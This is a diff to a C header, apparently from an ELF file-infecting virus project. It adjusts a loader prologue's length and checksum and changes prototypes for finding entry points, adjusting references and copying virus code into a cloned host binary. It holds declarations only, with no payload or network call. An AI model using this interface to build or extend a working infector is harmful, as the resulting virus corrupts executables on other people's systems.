@@ -17,8 +17,8 @@
 ** all registers and flags at the beginning of the loader code
 */
 
-# define LOADER_PROLOGUE_LEN	22
-# define LOADER_PROLOGUE_SUM	0x6e3
+# define LOADER_PROLOGUE_LEN	23
+# define LOADER_PROLOGUE_SUM	0x733
 
 /*
 ** entry point related informations
@@ -48,8 +48,8 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr file_ref, stru
 */
 
 bool		not_infected(const struct entry *file_entry, struct safe_ptr file_ref);
-bool		find_entry(struct entry *entry, struct safe_ptr ref, size_t full_virus_size);
-bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
+bool		find_entry(struct entry *entry, struct safe_ptr ref);
+bool		adjust_references(struct safe_ptr clone_ref, struct entry clone_entry, size_t shift_amount);
 bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
 bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, size_t payload_offset, const struct virus_header *vhdr);
@@ -65,5 +65,6 @@ typedef bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);
 
 bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
 bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);
+bool		foreach_shdr_entry(struct safe_ptr ref, size_t offset, f_iter_callback callback, void *data);
 
 #endif
